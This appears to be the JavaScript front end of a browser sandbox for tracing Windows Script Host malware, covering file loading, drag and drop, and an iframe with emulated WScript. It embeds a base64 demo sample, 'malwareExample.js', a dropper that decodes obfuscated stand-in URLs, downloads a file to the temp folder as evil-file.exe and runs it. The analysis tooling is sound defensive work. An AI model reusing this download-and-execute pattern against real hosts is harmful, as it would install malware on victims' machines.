// Check if browser supports necessary ES6 functionality
try {
    var _proxy = window.Proxy;
    if (!window.hasOwnProperty('Proxy')) {
        throw new Error('Proxy object not available');
    }

    if (!window.hasOwnProperty('Reflect')) {
        throw new Error('Reflect object not available');
    }

    if(!window.hasOwnProperty('FileReader')) {
        throw new Error('FileReader object not available');
    }
} catch (e) {
    var errorDiv = document.getElementById('incompatible-browser');
    errorDiv.innerHTML = e + '. Please use a more recent browser.';
    errorDiv.style.display = 'block';
}

// File upload handling
var fileupload = document.getElementById('fileupload'),
    fileuploadlabel = document.querySelector('label[for=fileupload]'),
    loadedDiv = document.getElementById('loaded'),
    inputDiv = document.getElementById('input');

var uploadhandler = function(e) {
    var file = (e.target.files || e.dataTransfer.files)[0];
    var reader = new FileReader();

    reader.onload = function(f) {
        setIframeCode(f.target.result);
        loaded.innerHTML = `Loaded: <span class="green">${file.name}</span> (${file.size} bytes)`;
    }

    if (file.size > 1048576) return false;

    reader.readAsBinaryString(file);
}

fileupload.addEventListener('change', uploadhandler);

// Drag/drop functionality
var topdiv = document.getElementById('top'),
    isDragging = false,
    resetDrag = function() {
        isDragging = false;
        fileuploadlabel.innerText = 'Load file';
        fileuploadlabel.style.borderColor = 'transparent';
    };

topdiv.addEventListener('dragover', function(e) {
    e.preventDefault();
    e.stopPropagation();

    if (!isDragging) {
        fileuploadlabel.innerText = 'Drop file';
        fileuploadlabel.style.borderColor = 'white';
        isDragging = true;
    }
});
topdiv.addEventListener('dragleave', function(e) {
    resetDrag();
});
topdiv.addEventListener('drop', function(e) {
    resetDrag();
    uploadhandler(e);
});

// Setting HTML for iframe
var setIframeCode = function(usercode, activeTab) {
    var ifr = document.getElementById('output-iframe'),
        tabsHTML,
        srcdoc;

    usercode = '\n' + usercode + '\n';
    activeTab = activeTab || 'vfs';

    var classA = 'class="active"',
        classS = 'class="show"';

    srcdoc = `<!doctype html><html>`
           + `<head><link href="styles.css" rel="stylesheet"></head>`
           + `<body id="innerframe">`
             + `<div id="left-panel"><div id="tracer" contenteditable></div></div>`
               + `<div id="right-panel">`
               + `<div id="tabs">`
                 + `<button type="button" id="inputbtn" ${activeTab === 'input' ? classA : ''}>Input</button>`
                 + `<button type="button" id="vfsbtn" ${activeTab === 'vfs' ? classA : ''}>VFS</button>`
                 + `<button type="button" id="consolebtn" ${activeTab === 'console' ? classA : ''}>Console</button>`
               + `</div>`
               + `<div id="input" ${activeTab === 'input' ? classS : ''}>`
                 + `<button id="runInput">Run</button>`
                 + `<textarea>${usercode}</textarea>`
               + `</div>`
               + `<div id="vfs" ${activeTab === 'vfs' ? classS : ''}></div>`
               + `<div id="console" ${activeTab === 'console' ? classS : ''}><textarea></textarea></div>`
             + `</div>`
			 + ``

             + `<script src="overrides.js"></script>`
             + `<script src="rendervfs.js"></script>`
             + `<script src="WScript.js"></script>`
             + `<script>(function() {${usercode}})();</script>`
             + `<script src="afterload.js"></script>`
           + `</body></html>`;

    ifr.srcdoc = srcdoc;
}

// Iniitialize
window.onload = () => setIframeCode('', 'input');

// Help
document.getElementById('togglehelp').addEventListener('click', e => {
    document.getElementById('help-inner').classList.toggle('show');
});

document.getElementById('loadExampleCode').addEventListener('click', e => {
    e.preventDefault();

    setIframeCode(atob(exampleCode));
    loaded.innerHTML = 'Loaded: <span class="green">malwareExample.js</span> (2044 bytes)';
});

// Malware example
const exampleCode = 'ZnVuY3Rpb24gcnVuU2hlbGxDb21tYW5kKGNvbW1hbmQpIHsKICAgIHZhciBzaGVsbCA9IFdTY3JpcHQuQ3JlYXRlT2JqZWN0KCJXc2NyaXB0LlNoZWxsIik7CiAgICBzaGVsbC5SdW4oY29tbWFuZCwgdHJ1ZSwgZmFsc2UpOwp9CgpmdW5jdGlvbiBnZXRUbXBGb2xkZXJMb2NhdGlvbigpIHsKICAgIHZhciBzaGVsbCA9IFdTY3JpcHQuQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIik7CiAgICByZXR1cm4gc2hlbGwuRXhwYW5kRW52aXJvbm1lbnRTdHJpbmdzKCIlVEVNUCVcXCIpOwp9CgpmdW5jdGlvbiBjcmVhdGVXU2NyaXB0T2JqZWN0KG9iaikgewogICAgLy8gY29uc29sZS5sb2cob2JqKTsKICAgIHZhciByZXMgPSBXU2NyaXB0LkNyZWF0ZU9iamVjdChvYmopOwogICAgcmV0dXJuIHJlczsKfQoKZnVuY3Rpb24gZGVjcnlwdFVybHMoYXJyKSB7CiAgICB2YXIgc3RyID0gIiI7CgogICAgZm9yICh4ID0gMDsgeCA8IGFyci5sZW5ndGg7IHgrKykgewogICAgICAgIGlmICh4ICUgMiAhPSAwKSB7CiAgICAgICAgICAgIHN0ciArPSBhcnIuc3Vic3RyKHgsIDEpOwogICAgICAgIH0KICAgIH0KCiAgICByZXR1cm4gc3RyOwp9Cgp2YXIgZW5jb2RlZFVybFN0cmluZyA9ICcwZTB4MGEwbTBwMGwwZTAuMGMwbzBtMC8wZjBhMGswZTBmMGkwbDBlMDEwIDBlMHgwYTBtMHAwbDBlMC4wYzBvMG0wLzBmMGEwazBlMGYwaTBsMGUwMjAgMD8wIDA/MCAwPyc7CnZhciB1cmxzID0gZGVjcnlwdFVybHMoZW5jb2RlZFVybFN0cmluZykuc3BsaXQoIiAiKTsKCnZhciB0bXBGb2xkZXIgPSBnZXRUbXBGb2xkZXJMb2NhdGlvbigpLAogICAgZmlsZU5hbWUgPSAiL2V2aWwtZmlsZS5leGUiLAogICAgZm9sZGVyTmFtZSA9ICJldmlsLWZvbGRlclxcIiwKICAgIGRlc3RGb2xkZXIgPSB0bXBGb2xkZXIgKyBmb2xkZXJOYW1lOwp2YXIgZGVzdGluYXRpb24gPSAgZGVzdEZvbGRlciArIGZpbGVOYW1lLAogICAgZmlsZVN5c3RlbSA9IG5ldyBBY3RpdmVYT2JqZWN0KCJTY3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdCIpOwoKdHJ5IHsKICAgIGZpbGVTeXN0ZW0uQ3JlYXRlRm9sZGVyKGRlc3RGb2xkZXIpOwp9IGNhdGNoKGUpIHsKCn07Cgp2YXIgaHR0cFN0cmVhbSA9IGNyZWF0ZVdTY3JpcHRPYmplY3QoIk1TWE1MMi5YTUxIVFRQIik7CnZhciBBRE9EQlN0cmVhbSA9IGNyZWF0ZVdTY3JpcHRPYmplY3QoIkFET0RCLlN0cmVhbSIpOwp2YXIgaSA9IDA7Cgp3aGlsZSAodHJ1ZSkgIHsKICAgIGlmIChpID49IHVybHMubGVuZ3RoKSB7CiAgICAgICAgYnJlYWs7CiAgICB9CgogICAgdmFyIGZpbmlzaGVkID0gZmFsc2U7CgogICAgdHJ5IHsKICAgICAgICBodHRwU3RyZWFtLm9wZW4oIkdFVCIsICdodHRwOi8vJyArIHVybHNbaV0gKyAxKTsKICAgICAgICBodHRwU3RyZWFtLnNlbmQoKTsKCiAgICAgICAgaWYgKGh0dHBTdHJlYW0uc3RhdHVzID09IDIwMCkgIHsKICAgICAgICAgICAgQURPREJTdHJlYW0ub3BlbigpOwogICAgICAgICAgICBBRE9EQlN0cmVhbS50eXBlID0gMTsKICAgICAgICAgICAgQURPREJTdHJlYW0ud3JpdGUoaHR0cFN0cmVhbS5yZXNwb25zZUJvZHkpOwoKICAgICAgICAgICAgaWYgKEFET0RCU3RyZWFtLnNpemUgPiAxNzYyNzcpICB7CiAgICAgICAgICAgICAgICBmaW5pc2hlZCA9IHRydWU7CiAgICAgICAgICAgICAgICBBRE9EQlN0cmVhbS5wb3NpdGlvbiA9IDA7CiAgICAgICAgICAgICAgICBBRE9EQlN0cmVhbS5zYXZlVG9GaWxlKGRlc3RpbmF0aW9uLCAyKTsKCiAgICAgICAgICAgICAgICB0cnkgIHsKICAgICAgICAgICAgICAgICAgICBydW5TaGVsbENvbW1hbmQoZGVzdGluYXRpb24pOwogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgfSBjYXRjaCAocmEpICB7CgogICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgfTsKCiAgICAgICAgICAgIEFET0RCU3RyZWFtLmNsb3NlKCk7CiAgICAgICAgfTsKCiAgICAgICAgaWYgKGZpbmlzaGVkKSBicmVhazsKICAgIH0gY2F0Y2ggKGUpICB7CgogICAgfTsKCiAgICBpKys7Cn07Cg==';
